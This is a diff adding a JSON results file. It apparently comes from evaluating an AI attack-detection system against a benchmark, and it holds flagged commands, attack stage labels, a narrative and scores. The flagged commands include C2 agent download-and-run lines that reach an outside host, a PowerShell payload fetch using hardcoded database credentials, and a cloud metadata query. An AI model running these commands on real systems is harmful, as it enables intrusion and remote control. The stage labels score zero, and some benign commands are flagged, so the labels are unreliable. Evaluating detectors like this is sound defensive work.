@@ -1,0 +1,104 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "base64 -d",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Execution"
+      },
+      {
+        "command": "wget --version > /dev/null",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "wget --connect-timeout=7 --tries=1 --dns-timeout=7 -q --header='Metadata:true' -O - http://169.254.169.254/metadata/instance?api-version=2019-03-11",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "curl -k --connect-timeout 10 \"https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "bash -c del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "server.sh sh /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/server.sh --start-server --host=127.0.0.1 --enable-remote-auto-shutdown --port=0 --connection-secret /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.token",
+        "stage": "Persistence"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\\Users\\Public\\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -server http://127.0.0.1:49152'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "node /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/bootstrap-fork --type=ptyHost",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "kill -9 $(lsof -i:8080 -t)",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "python -m SimpleHTTPServer 8079 > /dev/null 2>&1 &",
+        "stage": "Collection"
+      },
+      {
+        "command": "chmod +x sandcat-linux",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The attack appears to be a complex multi-stage operation involving initial access, defense evasion, execution, privilege escalation, collection, credential access, lateral movement, command and control, and persistence. The attackers initially gained access to the system using a variety of techniques, including exploiting known vulnerabilities and utilizing tools like wget and curl to retrieve information from metadata services and remote hosts. From there, they deleted logs, conducted reconnaissance, and escalated privileges, ultimately establishing persistent backdoors on multiple machines and maintaining control via various means.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 43030,
+      "completion_tokens": 3457,
+      "total_tokens": 46487,
+      "wall_clock_s": 68.153,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.3333333333333333,
+      "recall": 0.5555555555555556,
+      "f1": 0.4166666666666667,
+      "tp": 5,
+      "fp": 10,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 15,
+      "fn": 7,
+      "recall_partial": 0.21428571428571427
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 43030,
+      "completion_tokens": 3457,
+      "total_tokens": 46487,
+      "wall_clock_s": 68.153,
+      "parse_retries": 0
+    }
+  }
+}
